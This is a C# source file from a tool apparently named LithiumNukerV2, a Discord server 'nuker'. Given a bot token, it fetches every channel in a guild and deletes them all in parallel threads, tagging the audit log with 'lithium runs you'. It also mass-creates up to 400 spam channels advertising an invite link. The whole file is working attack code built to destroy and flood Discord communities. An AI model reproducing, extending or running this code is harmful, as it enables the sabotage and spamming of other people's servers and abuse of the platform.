// Sys
using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Dynamic;
using System.Text;
using System.Threading;
using System.Drawing;

// Custom
using LithiumNukerV2;
using Veylib.CLIUI;

// Nuget
using Newtonsoft.Json;

namespace LithiumCore
{
    public class Channels
    {
        public delegate void noret();
        public static event noret Finished;

        private static Core core = Core.GetInstance();

        private string token;
        private long guildId;
        private int threads;
        public Channels(string tok, long gid, int threadCount)
        {
            token = tok;
            guildId = gid;
            threads = threadCount;
        }

        public enum Type
        {
            Voice,
            Text,
            Stage,
            Category
        }

        public class Channel
        {
            // Placeholder only
            public Channel()
            {

            }

            public Channel(dynamic raw)
            {
                if (raw.message != null && raw.message == "You are being rate limited")
                    throw new Exception("Ratelimited");

                _raw = raw;
                Id = raw.id;
                Name = raw.name;
                
                switch ((int)raw.type)
                {
                    case 0:
                        Type = Type.Text;
                        break;
                    case 2:
                        Type = Type.Voice;
                        break;
                    case 4:
                        Type = Type.Category;
                        break;
                    case 13:
                        Type = Type.Stage;
                        break;
                    default:
                        throw new Exception("Bad type");
                }
            }

            public Type Type;
            public long Id;
            public string Name;
            public dynamic _raw;

            public List<Webhooks.Webhook> GetWebhooks(string token)
            {
                var whs = new List<Webhooks.Webhook>();

                var req = WebRequest.Create($"https://discord.com/api/v9/channels/{Id}/webhooks");
                req.Headers.Add("Authorization", $"Bot {token}");
                req.Proxy = null;

                string raw;

                try
                {
                    raw = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
                }
                catch (WebException ex)
                {
                    raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                }

                dynamic json = JsonConvert.DeserializeObject(raw);

                if (json.Count == 0)
                    return whs;
                else if (json.GetType().Name != "JArray" && json.code != null && (int)json.code == 10003)
                    return whs;

                foreach (var wh in json)
                    whs.Add(new Webhooks.Webhook(wh));

                return whs;
            }

            public void Delete(string token)
            {
                var req = WebRequest.Create($"https://discord.com/api/v9/channels/{Id}");
                req.Method = "DELETE";
                req.Headers.Add("Authorization", $"Bot {token}");
                req.Headers.Add("X-Audit-Log-Reason", "lithium runs you");
                var res = req.GetResponse();
                res.Dispose();
            }
        }

        /// <summary>
        /// Gets all channels in a guild
        /// </summary>
        /// <param name="guild">Guild ID</param>
        /// <returns>List of channels</returns>
        public List<Channel> GetAll()
        {
            // Create the return list
            var channels = new List<Channel>();

            // Create the request
            var req = WebRequest.Create($"https://discord.com/api/v9/guilds/{guildId}/channels");
            req.Headers.Add("Authorization", $"Bot {token}");
            req.Proxy = null;
            
            // Setup return vars
            string raw = null;
            dynamic json = null;

            // Get the raw response
            try
            {
                raw = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
            }
            catch (WebException ex)
            {
                raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
            }

            // Parse and iterate through
            json = JsonConvert.DeserializeObject(raw);
            foreach (var chan in json)
            {
                try
                {
                    channels.Add(new Channel(chan));
                }
                catch { }
            }

            // Return the channels collected
            return channels;
        }

        public Channel Create(string name, Type type)
        {
            var req = WebRequest.Create($"https://discord.com/api/v9/guilds/{guildId}/channels");
            req.Method = "POST";
            req.ContentType = "application/json";
            req.Headers.Add("Authorization", $"Bot {token}");
            req.Proxy = null;

            // default to text
            int chantype = 0;
            switch (type)
            {
                case Type.Voice:
                    chantype = 2;
                    break;  
                case Type.Stage:
                    chantype = 13;
                    break;
            }

            byte[] body = Encoding.UTF8.GetBytes("{ \"topic\": \"discord.gg/lith\", \"name\": \"" + name + "\", \"type\": " + chantype + " }");
            var reqstr = req.GetRequestStream();
            reqstr.Write(body, 0, body.Length);
            reqstr.Dispose();

            string raw;
            dynamic json;

            try 
            {
                var res = req.GetResponse();
                res.Close();
                raw = new StreamReader(res.GetResponseStream()).ReadToEnd();
                core.WriteLine("Created channel ", Color.White, name);
            } catch (WebException ex)
            {
                raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                core.WriteLine(Color.Red, $"Failed to create channel: {ex.Message}");
            }

            // Conversion and finising
            json = JsonConvert.DeserializeObject(raw);

            try
            {
                var ch = new Channel(json);
                return ch;
            } catch
            {
                return null;
            }
        }

        public List<Channel> Spam(string name, Type type, int count)
        {
            // 400 Channels max, cap it to save on resources.
            count = Math.Min(400, count);

            var channels = new List<Channel>();

            for (var x =0;x < count; x++)
                channels.Add(new Channel());

            var loads = WorkController.Seperate(channels, threads);
            int finished = 0;

            channels.Clear();

            foreach (var load in loads)
            {
                new Thread(() =>
                {
                    for (var x = 0;x < load.Count;x++)
                    {
                        try
                        {
                            var chan = Create(name, type);
                            channels.Add(chan);
                        }
                        catch {  }
                    }
                    finished++;
                }).Start();
            }

            while (finished < count)
                Thread.Sleep(20);

            return channels;
        }

        public void Nuke()
        {
            // Setup work loads
            var channels = GetAll();
            var loads = WorkController.Seperate(channels, threads);
            var errors = new List<Exception>();
            int finished = 0;

            foreach (var load in loads)
            {
                // Create new thread
                new Thread(() =>
                {
                    // Iterate thru sublist and delete each channel within
                    foreach (var chan in load)
                    {
                        try
                        {
                            chan.Delete(token);
                            core.WriteLine($"Deleted ", Color.White, chan.Name);
                        } catch (Exception ex)
                        {
                            errors.Add(ex);
                            core.WriteLine(Color.Red, $"Failed to delete channel {chan.Name} ({chan.Id}): {ex.Message}");
                        }
                    }
                    finished++;
                }).Start();
            }

            while (finished < loads.Count)
                Thread.Sleep(20);

            core.WriteLine(Color.Lime, $"Finished nuking {channels.Count} channels");
            Finished?.Invoke();
        }
    }
}